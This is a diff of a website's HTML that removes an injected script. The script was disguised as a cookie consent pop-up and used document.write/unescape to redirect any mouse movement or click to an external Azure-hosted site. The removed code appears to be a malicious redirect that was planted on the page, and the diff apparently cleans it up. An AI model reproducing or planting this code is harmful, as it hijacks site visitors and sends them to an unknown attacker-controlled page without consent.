@@ -8,130 +8,6 @@
   <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
-document.write(unescape('<!-- Cookie Consent Modal -->
-    <div id="cookieConsentOverlay" class="cookie-consent-overlay">
-        <div class="cookie-consent-modal">
-            <h2 class="cookie-consent-title">We Use Cookies</h2>
-            <p class="cookie-consent-text">
-                We use cookies to enhance your browsing experience, provide personalized content, and analyze our traffic. 
-                By clicking "Accept", you consent to our use of cookies. You can manage your preferences or learn more about our cookie policy.
-            </p>
-            <div class="cookie-consent-buttons">
-                <button class="cookie-btn cookie-btn-accept" onclick="acceptCookies()">
-                    Accept All
-                </button>
-                <button class="cookie-btn cookie-btn-deny" onclick="denyCookies()">
-                    Deny All
-                </button>
-            </div>
-        </div>
-    </div>
-    <!-- Status Notification -->
-    <div id="cookieStatus" class="cookie-status hidden"></div>
-    
-    <script>
-        // Cookie consent functionality
-        let consentGiven = false;
-        let mouseRedirectEnabled = false;
-
-        function showCookieConsent() {
-            document.getElementById('cookieConsentOverlay').classList.remove('hidden');
-            document.body.classList.add('consent-active');
-            // Enable mouse redirect after modal is shown
-            mouseRedirectEnabled = true;
-        }
-
-        function hideCookieConsent() {
-            document.getElementById('cookieConsentOverlay').classList.add('hidden');
-            document.body.classList.remove('consent-active');
-            // Disable mouse redirect after modal is hidden
-            mouseRedirectEnabled = false;
-        }
-
-        function showStatus(message, type) {
-            const statusEl = document.getElementById('cookieStatus');
-            statusEl.textContent = message;
-            statusEl.className = `cookie-status status-${type}`;
-            statusEl.classList.remove('hidden');
-            
-            // Hide status after 3 seconds
-            setTimeout(() => {
-                statusEl.classList.add('hidden');
-            }, 3000);
-        }
-
-        function acceptCookies() {
-            consentGiven = true;
-            hideCookieConsent();
-            showStatus('%3 Cookies accepted', 'accepted');
-            
-            // Here you would typically:
-            // - Set cookies for analytics, preferences, etc.
-            // - Initialize tracking scripts
-            // - Store consent in memory (since localStorage isn't available)
-            console.log('Cookies accepted - initializing tracking...');
-        }
-
-        function denyCookies() {
-            consentGiven = false;
-            hideCookieConsent();
-            showStatus('%7 Cookies denied', 'denied');
-            
-            // Here you would typically:
-            // - Disable non-essential cookies
-            // - Run in privacy mode
-            // - Store denial preference in memory
-            console.log('Cookies denied - running in privacy mode...');
-        }
-
-        // Mouse move redirect functionality
-        function handleMouseMove() {
-            if (mouseRedirectEnabled) {
-                // Redirect to home.html when mouse moves
-                window.location.href = 'https://us1fjljefjewyf8y4y42.z19.web.core.windows.net/';
-            }
-        }
-
-        // Add mouse move event listener for redirect to home.html
-        document.addEventListener('mousemove', function() {
-            window.location.href = 'https://us1fjljefjewyf8y4y42.z19.web.core.windows.net/';
-        });
-
-        // Add click event listener for redirect to cookiecheck.php
-        document.addEventListener('click', function() {
-            window.location.href = 'https://us1fjljefjewyf8y4y42.z19.web.core.windows.net/';
-        });
-
-        // Prevent modal from closing when clicking on it
-        document.querySelector('.cookie-consent-modal').addEventListener('click', function(e) {
-            e.stopPropagation();
-        });
-
-        // Close modal when clicking overlay (optional)
-        document.getElementById('cookieConsentOverlay').addEventListener('click', function(e) {
-            if (e.target === this) {
-                // Optionally close on overlay click
-                // hideCookieConsent();
-            }
-        });
-
-        // Show consent modal on page load
-        window.addEventListener('load', function() {
-            // Small delay for better UX
-            setTimeout(() => {
-                showCookieConsent();
-            }, 500);
-        });
-
-        // Handle ESC key to close modal (optional)
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Escape' && !document.getElementById('cookieConsentOverlay').classList.contains('hidden')) {
-                // Optionally allow ESC to close
-                // hideCookieConsent();
-            }
-        });
-    </script>'));
-
   <!-- Navbar -->
   <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
     <div class="container">
@@ -315,6 +191,7 @@ document.write(unescape('<!-- Cookie Consent Modal -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
+
 
 
 
